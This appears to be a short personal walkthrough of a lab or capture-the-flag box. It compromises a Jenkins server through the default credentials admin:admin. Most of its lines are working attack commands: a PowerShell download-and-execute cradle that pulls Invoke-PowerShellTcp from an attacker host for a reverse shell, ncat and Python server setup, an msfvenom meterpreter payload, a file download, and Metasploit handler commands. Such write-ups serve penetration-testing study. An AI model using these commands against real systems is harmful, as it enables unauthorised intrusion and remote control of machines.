Started with Nmap scan
Found Jenkins on 8080 and password was admin:admin #guess


In a job added:
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

Before running job started python server to transfer from:
 python3 -m http.server
And started ncat listener
 nc -lvnp <port>

Once I had access with basic tcp reverse shell I set up meterpreter
Created shell exe in msfvenom
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

Once made sent over python server and powershell:
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

Before running needed to set up handler in metasploit:
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST your-ip
 set LPORT listening-port run

Ran reverse shell with:
 Start-Process "shell-name.exe"

Used whoami /priv to determine privileges on orig. shell
